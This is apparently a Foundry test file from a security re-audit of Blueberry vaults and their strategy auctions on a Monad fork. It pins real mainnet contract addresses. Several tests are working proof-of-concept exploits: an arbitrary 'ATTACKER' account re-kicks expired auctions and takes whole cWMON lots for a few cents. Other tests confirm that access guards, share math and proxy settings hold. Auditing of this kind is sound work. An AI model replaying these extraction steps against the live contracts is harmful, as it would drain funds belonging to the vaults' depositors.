// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";

/* ------------------------------------------------------------------
   Blueberry QC-4 — ADVERSARIAL re-audit (Monad fork).
   Goal: try to BREAK the prior "E-U = $0.84 dust" closure.

   Read-only fork simulation. NO mainnet transactions, no keys.
   Everything below executes only inside an anvil fork.

   Fresh findings tested here:
     A) AuctionSwapper.kickAuction() in this deployed version is
        PERMISSIONLESS (no onlyKeepers). Anyone can kick enabled
        tokens; expired auctions can be re-kicked.
     B) The prior deep dive missed THREE additional strategy auctions
        (q1/q2/q3) holding cWMON lots (7.66 + 0.44 + 4.88 = 12.98
        cWMON) that are expired and re-kickable by anyone.
     C) Full extraction of ALL auctioned cWMON for ~0.007 want each.
     D) Vault share-math edges, donation variants, proxy/init
        surfaces, RoleManager/Accountant guards.
------------------------------------------------------------------- */

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
}

interface IVault {
    function asset() external view returns (address);
    function totalAssets() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function totalIdle() external view returns (uint256);
    function totalDebt() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function convertToAssets(uint256) external view returns (uint256);
    function convertToShares(uint256) external view returns (uint256);
    function previewDeposit(uint256) external view returns (uint256);
    function previewRedeem(uint256) external view returns (uint256);
    function maxRedeem(address) external view returns (uint256);
    function deposit(uint256, address) external returns (uint256);
    function mint(uint256, address) external returns (uint256);
    function redeem(uint256, address, address) external returns (uint256);
    function redeem(uint256, address, address, uint256) external returns (uint256);
    function withdraw(uint256, address, address, uint256) external returns (uint256);
    function pricePerShare() external view returns (uint256);
    function roles(address) external view returns (uint256);
    function role_manager() external view returns (address);
    function accountant() external view returns (address);
    function strategies(address) external view returns (uint256, uint256, uint256, uint256);
    function get_default_queue() external view returns (address[] memory);
    function isPaused() external view returns (bool);
    function isShutdown() external view returns (bool);
    function set_role(address, uint256) external;
    function set_accountant(address) external;
    function set_default_queue(address[] calldata) external;
    function setPaused(bool) external;
    function shutdown_vault() external;
    function buy_debt(address, uint256) external;
    function process_report(address) external returns (uint256, uint256);
    function update_debt(address, uint256, uint256) external returns (uint256);
}

interface IStrategy {
    function asset() external view returns (address);
    function totalAssets() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function convertToAssets(uint256) external view returns (uint256);
    function management() external view returns (address);
    function keeper() external view returns (address);
    function open() external view returns (bool);
    function allowed(address) external view returns (bool);
    function useAuction() external view returns (bool);
    function auction() external view returns (address);
    function markets(uint256) external view returns (address);
    function marketsLength() external view returns (uint256);
    function maxDeposit(address) external view returns (uint256);
    function deposit(uint256, address) external returns (uint256);
    function previewWithdraw(uint256) external view returns (uint256);
    function report() external returns (uint256, uint256);
    function tend() external;
    function shutdownStrategy() external;
    function emergencyWithdraw(uint256) external;
    function kickAuction(address) external returns (uint256);
    function setKeeper(address) external;
    function setPendingManagement(address) external;
    function setPerformanceFee(uint16) external;
    function setAuction(address) external;
    function setUseAuction(bool) external;
    function setMinAmountToSell(address, uint256) external;
}

interface IAuction {
    function isActive(address) external view returns (bool);
    function available(address) external view returns (uint256);
    function getAmountNeeded(address) external view returns (uint256);
    function price(address) external view returns (uint256);
    function auctions(address) external view returns (uint64, uint64, uint128);
    function getAllEnabledAuctions() external view returns (address[] memory);
    function governanceOnlyKick() external view returns (bool);
    function minimumPrice() external view returns (uint256);
    function startingPrice() external view returns (uint256);
    function want() external view returns (address);
    function receiver() external view returns (address);
    function governance() external view returns (address);
    function kick(address) external returns (uint256);
    function take(address) external returns (uint256);
    function kickable(address) external view returns (uint256);
}

interface IRoleManager {
    function getGovernance() external view returns (address);
    function getPendingGovernance() external view returns (address);
    function setPositionHolder(bytes32, address) external;
    function acceptGovernance() external;
}

interface IAccountant {
    function feeManager() external view returns (address);
    function feeRecipient() external view returns (address);
    function redeemUnderlying(address) external;
    function distribute(address) external;
    function acceptFeeManager() external;
}

contract BlueberryQcTest is Test {
    // ---- pinned fork (state read 2026-10-13; opt2 auction active) ----
    uint256 constant FORK_BLOCK = 113_070_305;

    // ---- Monad (chainid 143) ----
    address constant V1 = 0xC2ddc1004CA0d6cC4bFd1dCD03Dcf855bED8E670; // Blueberry AUSD (Yearn V3.1.0)
    address constant V2 = 0x215394B5677Cb7a18B6fA8cc2cD155C024ee6b2E; // Blueberry USDC
    address constant AUSD = 0x00000000eFE302BEAA2b3e6e1b18d08D69a9012a;
    address constant USDC = 0x754704Bc059F8C67012fEd69BC8A327a5aafb603;
    address constant CWMON = 0xE01d426B589c7834a5F6B20D7e992A705d3c22ED;

    address constant OPT1 = 0x460BBe066AA0ff94d7AFCd95580c41190FC4C7E4; // CurvanceOptimizer AUSD (V1 strategy)
    address constant OPT2 = 0xe43b232FA6Ce535C6B4F8771427eBd4a77Bad593; // CurvanceOptimizer USDC (V2 strategy)
    address constant Q1 = 0x481d416F84703aFaA637ba036121664C9D05dbC6;   // orphan queue strategy V1[1]
    address constant Q2 = 0x814b6605CD2efEe011cd2bBC1c03C4715C92e071;   // orphan queue strategy V1[2]
    address constant Q3 = 0x5B5d3dDE4ee026AEdB7B7C688A0b31EA25B8F4b3;   // orphan queue strategy V2[1]

    address constant AUC_OPT1 = 0x86422aFe11950be742F68A83eF60B2A3BbfaF195;
    address constant AUC_OPT2 = 0xd84472f841E1AB683f2Ce03f15051cb233F0a730;
    address constant AUC_Q1 = 0xe0fC85eFe13D01DF26273a6129aDac3D7D9dd328;
    address constant AUC_Q2 = 0xC338586B05863a7C0a43Ffee5457D22bd4a89853;
    address constant AUC_Q3 = 0xBCa2a27aA492FBAc4782a9ae10BAe94209Ce907f;

    address constant SAFE = 0x72d19f7c71a2bD5E61871B1D3dF7a45ae5Ec9582; // 3-of-4 mgmt Safe, all roles
    address constant KEEPER = 0xf6b6dA3bbA0caA61eC3C65ad87a61b9d0130457b;
    address constant ROLE_MANAGER = 0x5b79684891c55A9E042Cd5D7719c211Bee17Ab39;
    address constant ACCOUNTANT = 0xf7E5C38800498d773C875D447413b3B30F816190;

    // real token holders used read-only as faucets inside the fork
    address constant AUSD_WHALE = 0xD1BFEA1728ffe98F515f26082fACfcc3341691D4;
    address constant USDC_WHALE = 0x207340D15F4E3C63AE610429f34b87C73a5D55e5;

    address constant ATTACKER = address(0xdeadbeef01);

    // external market reference (DefiLlama, 2026-10-13): MON = $0.02440884
    uint256 constant MON_USD_1E18 = 0.02440883840087672e18;
    // decay: 50 bps/60s, AUCTION_LENGTH 1 day -> min multiplier ~= 0.995**1440
    uint256 constant WARP_TO_END = 86_390; // seconds after kick (auction still active)
    uint256 constant WARP_Q1 = 50_000; // q1 per-token price floor 0.02 -> take just above it
    uint256 constant WARP_Q3 = 55_000; // q3 per-token price floor 0.02 -> take just above it

    function setUp() public {
        string memory rpc = vm.envOr("MONAD_RPC_URL", string("https://rpc.monad.xyz"));
        // Fork at the RPC head first, then re-pin a few hundred blocks behind it so the
        // public RPC definitely serves the state (Monad public RPC prunes old state).
        vm.createSelectFork(rpc);
        uint256 head = block.number;
        uint256 pin = vm.envOr("MONAD_FORK_BLOCK", head > 1000 ? head - 200 : head);
        vm.createSelectFork(rpc, pin);
        console2.log("Monad QC fork block", block.number, "head", head);
    }

    function _fund(address token, address whale, address to, uint256 amount) internal {
        vm.prank(whale);
        IERC20(token).transfer(to, amount);
    }

    function _cmonValueUsd(uint256 cmonAmount) internal view returns (uint256) {
        // cWMON is an ERC4626 whose asset is 1:1 with MON (WMON). value = amount * rate * MON price
        uint256 rate = IStrategy(CWMON).convertToAssets(1e18);
        return (cmonAmount * rate / 1e18) * MON_USD_1E18 / 1e18;
    }

    /* ==================================================================
       1) The auction surface: only cWMON enabled, but FIVE auctions,
          three of them expired with lots still inside.
    ================================================================== */
    function test_qc01_auction_surface() public {
        address[5] memory aucs = [AUC_OPT1, AUC_OPT2, AUC_Q1, AUC_Q2, AUC_Q3];
        uint256 totalLot;
        for (uint256 i; i < 5; ++i) {
            IAuction a = IAuction(aucs[i]);
            address[] memory enabled = a.getAllEnabledAuctions();
            assertEq(enabled.length, 1, "exactly one enabled token");
            assertEq(enabled[0], CWMON, "enabled token is cWMON");
            assertEq(a.governanceOnlyKick(), false, "kick is permissionless");
            uint256 bal = IERC20(CWMON).balanceOf(aucs[i]);
            (uint64 kicked,,) = a.auctions(CWMON);
            console2.log("auction", aucs[i]);
            console2.log("   balance", bal);
            console2.log("   active", a.isActive(CWMON));
            console2.log("   kicked", kicked);
            totalLot += bal;
        }
        // cWMON is the ONLY auction-enabled token on all five strategies' auctions
        assertGt(totalLot, 0, "auctioned cWMON lots exist");
        console2.log("TOTAL auctioned cWMON (1e18):", totalLot);
        console2.log("TOTAL USD value:", _cmonValueUsd(totalLot));
        // prior census (block 113_070_305): 30.64 + 7.66 + 0.44 + 4.88 = 43.62 cWMON
        console2.log("prior census lot (1e18):", uint256(43.61880388448529e18));
    }

    /* ==================================================================
       2) kickAuction() is permissionless in the deployed version.
          (Prior README implies keeper-only; it is NOT.)
    ================================================================== */
    function test_qc02_kickAuction_permissionless() public {
        // fresh EOA attacker can (re-)kick an enabled token: no keeper gate in this version
        uint256 before = IERC20(CWMON).balanceOf(AUC_Q1);
        vm.prank(ATTACKER);
        (bool ok,) = Q1.call(abi.encodeWithSignature("kickAuction(address)", CWMON));
        assertTrue(ok, "kickAuction callable by any EOA (permissionless)");
        assertTrue(IAuction(AUC_Q1).isActive(CWMON), "q1 auction active after kick");
        uint256 afterBal = IERC20(CWMON).balanceOf(AUC_Q1);
        assertGe(afterBal, before, "lot not lost");
        console2.log("q1 kicked by EOA attacker; lot now", afterBal);

        // protected asset cannot be kicked
        vm.prank(ATTACKER);
        (bool ok2,) = OPT1.call(abi.encodeWithSignature("kickAuction(address)", AUSD));
        assertFalse(ok2, "kickAuction(asset) reverts (protected)");

        // protected Curvance market cannot be kicked (positions are protected)
        address mkt0 = IStrategy(OPT1).markets(0);
        vm.prank(ATTACKER);
        (bool ok3,) = OPT1.call(abi.encodeWithSignature("kickAuction(address)", mkt0));
        assertFalse(ok3, "kickAuction(market) reverts (protected)");

        // non-enabled token cannot be kicked even when not protected
        vm.prank(ATTACKER);
        (bool ok4,) = OPT1.call(abi.encodeWithSignature("kickAuction(address)", USDC));
        assertFalse(ok4, "kickAuction(non-enabled) reverts");
    }

    /* ==================================================================
       3) Full extraction of the ACTIVE opt2 auction for ~0.007 USDC.
    ================================================================== */
    function test_qc03_extract_opt2_auction() public {
        IAuction a = IAuction(AUC_OPT2);
        uint256 lot = IERC20(CWMON).balanceOf(AUC_OPT2);
        (uint64 kicked,,) = a.auctions(CWMON);
        if (!a.isActive(CWMON)) {
            // expired or never kicked: anyone can (re-)kick, sweeping strategy dust too
            vm.prank(ATTACKER);
            OPT2.call(abi.encodeWithSignature("kickAuction(address)", CWMON));
            (, kicked,) = a.auctions(CWMON);
            lot = IERC20(CWMON).balanceOf(AUC_OPT2);
        }
        if (lot == 0) {
            console2.log("opt2 lot empty at this fork block (already taken); nothing to extract");
            return;
        }
        vm.warp(uint256(kicked) + WARP_TO_END);
        uint256 need = a.getAmountNeeded(CWMON);
        console2.log("opt2 lot", lot);
        console2.log("opt2 price to take now (USDC 1e6):", need);

        _fund(USDC, USDC_WHALE, ATTACKER, 1e6);
        vm.startPrank(ATTACKER);
        IERC20(USDC).approve(AUC_OPT2, type(uint256).max);
        uint256 got = a.take(CWMON);
        vm.stopPrank();

        uint256 value = _cmonValueUsd(got);
        console2.log("took cWMON", got);
        console2.log("paid USDC   ", need);
        console2.log("value USD 1e18", value);
        assertEq(got, lot, "whole lot taken");
        assertLt(need, 0.05e6, "paid < 5 cents");
        assertGt(value, need * 10, "net extraction > 10x payment");
    }

    /* ==================================================================
       4) The two orphan lots (q1 AUSD-auction, q3 USDC-auction) the
          prior dive missed: kick + take by any EOA.
    ================================================================== */
    function test_qc04_extract_q1_and_q3_orphan_lots() public {
        // --- q1 (want = AUSD) ---
        if (IERC20(CWMON).balanceOf(AUC_Q1) > 0) {
            if (!IAuction(AUC_Q1).isActive(CWMON)) {
                vm.prank(ATTACKER);
                (bool ok,) = Q1.call(abi.encodeWithSignature("kickAuction(address)", CWMON));
                assertTrue(ok, "q1 re-kick by attacker");
            }
            (uint64 kicked1,,) = IAuction(AUC_Q1).auctions(CWMON);
            uint256 lot1 = IAuction(AUC_Q1).available(CWMON);
            vm.warp(uint256(kicked1) + WARP_Q1);
            uint256 need1 = IAuction(AUC_Q1).getAmountNeeded(CWMON);
            _fund(AUSD, AUSD_WHALE, ATTACKER, 1e6);
            vm.startPrank(ATTACKER);
            IERC20(AUSD).approve(AUC_Q1, type(uint256).max);
            uint256 got1 = IAuction(AUC_Q1).take(CWMON);
            vm.stopPrank();
            uint256 val1 = _cmonValueUsd(got1);
            console2.log("q1 took", got1);
            console2.log("q1 paid AUSD", need1);
            console2.log("q1 value USD", val1);
            assertEq(got1, lot1, "q1 lot taken");
            uint256 need1Usd = need1 * 1e12;
            assertGt(val1, need1Usd, "q1 still profitable above per-token floor");
            console2.log("q1 net USD", val1 - need1Usd);
        } else {
            console2.log("q1 lot empty at fork block; skipped");
        }

        // --- q3 (want = USDC) ---
        if (IERC20(CWMON).balanceOf(AUC_Q3) > 0) {
            if (!IAuction(AUC_Q3).isActive(CWMON)) {
                vm.prank(ATTACKER);
                (bool ok,) = Q3.call(abi.encodeWithSignature("kickAuction(address)", CWMON));
                assertTrue(ok, "q3 re-kick by attacker");
            }
            (uint64 kicked3,,) = IAuction(AUC_Q3).auctions(CWMON);
            uint256 lot3 = IAuction(AUC_Q3).available(CWMON);
            vm.warp(uint256(kicked3) + WARP_Q3);
            uint256 need3 = IAuction(AUC_Q3).getAmountNeeded(CWMON);
            _fund(USDC, USDC_WHALE, ATTACKER, 1e6);
            vm.startPrank(ATTACKER);
            IERC20(USDC).approve(AUC_Q3, type(uint256).max);
            uint256 got3 = IAuction(AUC_Q3).take(CWMON);
            vm.stopPrank();
            uint256 val3 = _cmonValueUsd(got3);
            console2.log("q3 took", got3);
            console2.log("q3 paid USDC", need3);
            console2.log("q3 value USD", val3);
            assertEq(got3, lot3, "q3 lot taken");
            uint256 need3Usd = need3 * 1e12;
            assertGt(val3, need3Usd, "q3 still profitable above per-token floor");
            console2.log("q3 net USD", val3 - need3Usd);
        } else {
            console2.log("q3 lot empty at fork block; skipped");
        }
    }

    /* ==================================================================
       5) q2 lot is NOT extractable at a profit (min price > value) —
          documents the limit of the revised E-U.
    ================================================================== */
    function test_qc05_q2_not_profitable() public {
        vm.prank(ATTACKER);
        IStrategy(Q2).kickAuction(CWMON);
        (uint64 kicked2,,) = IAuction(AUC_Q2).auctions(CWMON);
        uint256 lot2 = IAuction(AUC_Q2).available(CWMON);
        vm.warp(uint256(kicked2) + WARP_TO_END);
        uint256 need2 = IAuction(AUC_Q2).getAmountNeeded(CWMON);
        uint256 val2 = _cmonValueUsd(lot2);
        console2.log("q2 lot", lot2);
        console2.log("q2 min-achievable payment (AUSD 1e6)", need2);
        console2.log("q2 value USD", val2);
        uint256 need2Usd = need2 * 1e12; // AUSD ~= $1, 6 decimals
        assertGt(need2Usd, val2, "q2: payment exceeds value -> no profit");
    }

    /* ==================================================================
       6) Vault share-math edges: donations, round-trips, sandwich.
    ================================================================== */
    function test_qc06_vault_math_edges() public {
        // donation to vault / strategy leaves pps and share math unchanged
        uint256 ta0 = IVault(V1).totalAssets();
        uint256 pps0 = IVault(V1).pricePerShare();
        uint256 c2s0 = IVault(V1).convertToShares(1000e6);
        _fund(AUSD, AUSD_WHALE, V1, 100_000e6);
        _fund(AUSD, AUSD_WHALE, OPT1, 100_000e6);
        assertEq(IVault(V1).totalAssets(), ta0, "donation: totalAssets unchanged");
        assertEq(IVault(V1).pricePerShare(), pps0, "donation: pps unchanged");
        assertEq(IVault(V1).convertToShares(1000e6), c2s0, "donation: c2s unchanged");

        // round-trips cannot profit, incl. tiny amounts
        uint256[4] memory amts = [uint256(2), 1000, 123_456, 10_000e6];
        for (uint256 i; i < 4; ++i) {
            uint256 amt = amts[i];
            _fund(AUSD, AUSD_WHALE, ATTACKER, amt);
            vm.startPrank(ATTACKER);
            IERC20(AUSD).approve(V1, type(uint256).max);
            uint256 b0 = IERC20(AUSD).balanceOf(ATTACKER);
            uint256 shares = IVault(V1).deposit(amt, ATTACKER);
            uint256 out = IVault(V1).redeem(shares, ATTACKER, ATTACKER);
            uint256 b1 = IERC20(AUSD).balanceOf(ATTACKER);
            vm.stopPrank();
            console2.log("amt/shares/out", amt, shares, out);
            assertLe(out, amt, "no round-trip profit");
            assertLe(b1, b0, "cannot end with more asset than started");
        }

        // donation sandwich: donate then redeem -> strictly worse
        _fund(AUSD, AUSD_WHALE, ATTACKER, 1000e6);
        vm.startPrank(ATTACKER);
        IERC20(AUSD).approve(V1, type(uint256).max);
        uint256 s = IVault(V1).deposit(1000e6, ATTACKER);
        vm.stopPrank();
        _fund(AUSD, AUSD_WHALE, OPT1, 1000e6); // attacker "donation" to strategy
        vm.prank(ATTACKER);
        uint256 out2 = IVault(V1).redeem(s, ATTACKER, ATTACKER);
        assertLt(out2, 1000e6, "donation+redeem is a pure loss");
        console2.log("sandwich out (was 1000e6):", out2);
    }

    /* ==================================================================
       7) Guard sweep: roles, init, emergency, accountant, role manager.
    ================================================================== */
    function test_qc07_guards_sweep() public {
        vm.startPrank(ATTACKER);

        // vault admin/reporting
        vm.expectRevert(); IVault(V1).process_report(OPT1);
        vm.expectRevert(); IVault(V1).update_debt(OPT1, 0, 0);
        vm.expectRevert(); IVault(V1).set_role(ATTACKER, 16383);
        vm.expectRevert(); IVault(V1).set_accountant(ATTACKER);
        address[] memory q = new address[](1); q[0] = ATTACKER;
        vm.expectRevert(); IVault(V1).set_default_queue(q);
        vm.expectRevert(); IVault(V1).setPaused(true);
        vm.expectRevert(); IVault(V1).shutdown_vault();
        vm.expectRevert(); IVault(V1).buy_debt(OPT1, 1e6);

        // strategy keeper/management/emergency
        vm.expectRevert(); IStrategy(OPT1).report();
        vm.expectRevert(); IStrategy(OPT1).tend();
        vm.expectRevert(); IStrategy(OPT1).shutdownStrategy();
        vm.expectRevert(); IStrategy(OPT1).emergencyWithdraw(1e6);
        vm.expectRevert(); IStrategy(OPT1).setKeeper(ATTACKER);
        vm.expectRevert(); IStrategy(OPT1).setPendingManagement(ATTACKER);
        vm.expectRevert(); IStrategy(OPT1).setPerformanceFee(10_000);
        vm.expectRevert(); IStrategy(OPT1).setAuction(ATTACKER);
        vm.expectRevert(); IStrategy(OPT1).setUseAuction(false);

        // strategy deposit closed (open=false; only vault whitelisted)
        assertEq(IStrategy(OPT1).maxDeposit(ATTACKER), 0, "attacker maxDeposit 0");

        vm.stopPrank();

        // re-init of the already-initialized vault / strategy must fail
        (bool ok1,) = V1.call(abi.encodeWithSignature(
            "initialize(address,string,string,address,address,uint256)",
            AUSD, "x", "x", ATTACKER, ATTACKER, 0));
        assertFalse(ok1, "vault re-init reverts");
        (bool ok2,) = OPT1.call(abi.encodeWithSignature(
            "initialize(address,string,address,address,address)",
            AUSD, "x", ATTACKER, ATTACKER, ATTACKER));
        assertFalse(ok2, "strategy re-init reverts");

        // accountant: onlyFeeManagerOrRecipient
        vm.startPrank(ATTACKER);
        vm.expectRevert(); IAccountant(ACCOUNTANT).redeemUnderlying(V1);
        vm.expectRevert(); IAccountant(ACCOUNTANT).distribute(AUSD);
        vm.expectRevert(); IAccountant(ACCOUNTANT).acceptFeeManager();
        vm.stopPrank();

        // role manager: two-step governance closed
        assertEq(IRoleManager(ROLE_MANAGER).getGovernance(), SAFE, "RM governance = Safe");
        assertEq(IRoleManager(ROLE_MANAGER).getPendingGovernance(), address(0), "no pending gov");
        vm.startPrank(ATTACKER);
        vm.expectRevert();
        IRoleManager(ROLE_MANAGER).setPositionHolder(keccak256("Governance"), ATTACKER);
        vm.expectRevert(); IRoleManager(ROLE_MANAGER).acceptGovernance();
        vm.stopPrank();
    }

    /* ==================================================================
       8) Proxy/upgrade surface: minimal proxies, no EIP-1967 storage.
    ================================================================== */
    function test_qc08_proxy_surface() public {
        assertEq(V1.code.length, 45, "V1 is a 45-byte EIP-1167 minimal proxy");
        assertEq(V2.code.length, 45, "V2 is a 45-byte minimal proxy");
        // EIP-1967 implementation slot + admin slot read zero on both vaults
        bytes32 implSlot = 0x360894a13BA1A3210667c828492Db98dcA3e2076cc3735a920a3ca505d382bbc;
        bytes32 adminSlot = 0xB53127684a568b3173Ae13B9f8a6016E243e63B6e8ee1178d6a717850b5d6103;
        for (uint256 i; i < 2; ++i) {
            address v = i == 0 ? V1 : V2;
            assertEq(uint256(vm.load(v, implSlot)), 0, "no EIP-1967 impl");
            assertEq(uint256(vm.load(v, adminSlot)), 0, "no EIP-1967 admin");
        }
        // strategy: ERC-1967 proxy to the singleton TokenizedStrategy, no admin slot
        assertEq(
            address(uint160(uint256(vm.load(OPT1, implSlot)))),
            0xD377919FA87120584B21279a491F82D5265A139c,
            "strategy -> canonical TokenizedStrategy singleton"
        );
        assertEq(uint256(vm.load(OPT1, adminSlot)), 0, "no proxy admin on strategy");
    }

    /* ==================================================================
       9) Live totals sanity: vault value still ~$1.2M, wholly H-O/P.
    ================================================================== */
    function test_qc09_live_totals() public {
        uint256 v1 = IVault(V1).totalAssets();
        uint256 v2 = IVault(V2).totalAssets();
        console2.log("V1 totalAssets AUSD 1e6:", v1);
        console2.log("V2 totalAssets USDC 1e6:", v2);
        address[] memory queue = IVault(V1).get_default_queue();
        console2.log("V1 queue length:", queue.length);
        assertGt(v1, 1_000_000e6, "V1 > $1M");
        assertGt(queue.length, 1, "queue includes orphan strategies");
    }
}
